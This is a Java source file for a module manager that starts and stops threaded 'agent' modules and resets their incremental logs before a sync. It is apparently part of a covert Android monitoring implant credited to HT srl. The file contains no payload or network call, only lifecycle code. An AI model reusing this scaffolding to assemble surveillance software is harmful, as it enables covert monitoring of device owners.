/* **********************************************
 * Create by : Alberto "Q" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 30-mar-2011
 **********************************************/

package com.android.dvci.manager;

import java.util.HashMap;
import java.util.Iterator;

import com.android.dvci.Trigger;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfModule;
import com.android.dvci.interfaces.IncrementalLog;
import com.android.dvci.module.BaseModule;
import com.android.dvci.module.FactoryModule;
import com.android.dvci.util.Check;
import com.android.dvci.util.Utils;

/**
 * The Class AgentManager.
 */
public class ManagerModule extends Manager<BaseModule, String, String> {

	/** The Constant TAG. */
	private static final String TAG = "AgentManager"; //$NON-NLS-1$

	/** The singleton. */
	private volatile static ManagerModule singleton;

	/**
	 * Self.
	 * 
	 * @return the agent manager
	 */
	public static ManagerModule self() {
		if (singleton == null) {
			synchronized (ManagerModule.class) {
				if (singleton == null) {
					singleton = new ManagerModule();
					singleton.setFactory(new FactoryModule());
				}
			}
		}

		return singleton;
	}

	/**
	 * Start agents.
	 * 
	 * @return true, if successful
	 */
	@Override
	public synchronized boolean startAll() {
		HashMap<String, ConfModule> agents;
		agents = status.getModulesMap();

		if (agents == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Agents map null");//$NON-NLS-1$
			}
			return false;
		}

		if (instances == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Running Agents map null");//$NON-NLS-1$
			}
			return false;
		}

		final Iterator<String> it = agents.keySet().iterator();

		while (it.hasNext()) {
			final String key = it.next();
			if (Cfg.DEBUG) {
				Check.asserts(key != null, "null type"); //$NON-NLS-1$
			}
			final ConfModule conf = agents.get(key);
			start(key);

		}

		return true;
	}

	// Deve essere bloccante. Attende l'effettivo stop di tutto.
	/**
	 * Stop agents.
	 */
	@Override
	public synchronized void stopAll() {
		HashMap<String, ConfModule> agents;
		agents = status.getModulesMap();
		final Iterator<String> it = agents.keySet().iterator();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (stopAll)");//$NON-NLS-1$
		}

		while (it.hasNext()) {
			final String key = it.next();
			stop(key);
		}

		if (Cfg.DEBUG) {
			Check.ensures(threads.size() == 0, "Non empty threads"); //$NON-NLS-1$
		}

		instances.clear();

		if (Cfg.DEBUG) {
			Check.ensures(instances.size() == 0, "Non empty running"); //$NON-NLS-1$
		}

		threads.clear();
	}

	/**
	 * Start agent.
	 * 
	 * @param key
	 *            the key
	 */
	public void start(final String key, Trigger trigger) {
		HashMap<String, ConfModule> agents = status.getModulesMap();

		if (agents == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Agents map null");//$NON-NLS-1$
			}
			return;
		}

		if (instances == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Running Agents map null");//$NON-NLS-1$
			}
			return;
		}

		BaseModule a = makeAgent(key);

		if (a == null) {
			return;
		}

		// Agent mapped and running
		if (a.isRunning() || a.base_isSuspended()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Agent " + key + " is already running or suspended");//$NON-NLS-1$ //$NON-NLS-2$
			}
			return;
		}

		if (Cfg.DEBUG) {
			Check.asserts(a != null, "null agent"); //$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.asserts(instances.get(key) != null, "null running"); //$NON-NLS-1$
		}

		if (a.setConf(agents.get(key))) {
			a.setTrigger(trigger);
			final Thread t = new Thread(a);
			if (Cfg.DEBUG) {
				t.setName(a.getClass().getSimpleName());
			}
			threads.put(a, t);
			t.start();
		} else {

			if (Cfg.DEBUG) {
				Check.log(TAG + " (start) Error: Cannot set Configuration");
			}
		}
	}

	private BaseModule makeAgent(String type) {
		if (instances.containsKey(type) == true) {
			BaseModule a =  instances.get(type);
			if (Cfg.DEBUG) {
				Check.log(TAG + " (makeAgent) Module:"+ type +"already present:"+a.hashCode() );
			}
			return a;
		}

		final BaseModule base = factory.create(type, null);

		if (base != null) {
			instances.put(type, base);
		}
		if (Cfg.DEBUG) {
			Check.log(TAG + " (makeAgent) Module:"+ type +" created :"+base.hashCode() );
		}
		return base;
	}

	public boolean isInstancedAgent(String type) {
		return instances.containsKey(type);
	}

	public boolean isInstancedAgent(Class<? extends BaseModule> cl) {
		return instances.containsKey(getType(cl));
	}
	
	public BaseModule getInstancedAgent(Class<? extends BaseModule> cl) {
		return instances.get(getType(cl));
	}

	/**
	 * Stop agent.
	 * 
	 * @param moduleId
	 *            the key
	 */
	@Override
	public void stop(final String moduleId) {
		final BaseModule a = instances.get(moduleId);

		if (a == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Agent " + moduleId + " not present");//$NON-NLS-1$ //$NON-NLS-2$
			}
			return;
		}

		a.stopThread();
		// running.remove(moduleId);

		final Thread t = threads.get(a);
		if (t != null) {
			try {
				t.join();
				if (Cfg.DEBUG) {
					Check.log(TAG + " (stop) " + moduleId + " stopped and joined");//$NON-NLS-1$ //$NON-NLS-2$
				}
			} catch (final InterruptedException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(e);//$NON-NLS-1$
				}
			}
			threads.remove(a);
		}else{
			if (Cfg.DEBUG) {
				Check.log(TAG + " (stop) " + moduleId + " stopped but not joined");//$NON-NLS-1$ //$NON-NLS-2$
			}
		}
	}

	/**
	 * resets incremental logs before sync
	 */
	public synchronized void resetIncrementalLogs() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (resetIncrementalLogs)");
		}
		for (BaseModule agent : threads.keySet()) {
			if (agent != null && agent instanceof IncrementalLog) {
				((IncrementalLog) agent).resetLog();
			}
		}

		Utils.sleep(2000);
	}

	@Override
	public void start(String moduleId) {
		start(moduleId, null);

	}

	public String getType(Class<? extends BaseModule> cl) {
		FactoryModule fm = (FactoryModule) factory;
		return fm.getType(cl);
	}

}
